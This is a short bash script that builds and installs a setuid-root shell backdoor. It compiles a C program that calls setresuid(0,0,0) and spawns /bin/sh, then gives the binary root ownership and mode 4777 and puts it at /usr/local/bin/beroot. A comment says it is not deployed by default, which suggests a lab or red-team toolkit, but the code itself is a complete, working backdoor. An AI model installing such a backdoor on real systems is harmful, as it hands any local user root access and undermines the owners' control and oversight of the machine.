#!/bin/bash

# create a privilege escalation backdoor bin
# by default this is not copied or ran on any nodes

where_gcc=$(which gcc || exit 1)

TMPFILE="devtest.c"
FILEDEST="/usr/local/bin/beroot"
TMPDIR=$(mktemp -d)
cd $TMPDIR || exit 1;

# create suid laucher c
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPFILE

# compile
$where_gcc $TMPFILE -o suid 2>/dev/null

rm -f $TMPFILE

sudo chown root:root suid

sudo chmod 4777 suid

sudo mv -v suid $FILEDEST

# test
echo 'whoami && hostname' | $FILEDEST

# clean up
rm -rf -- $TMPDIR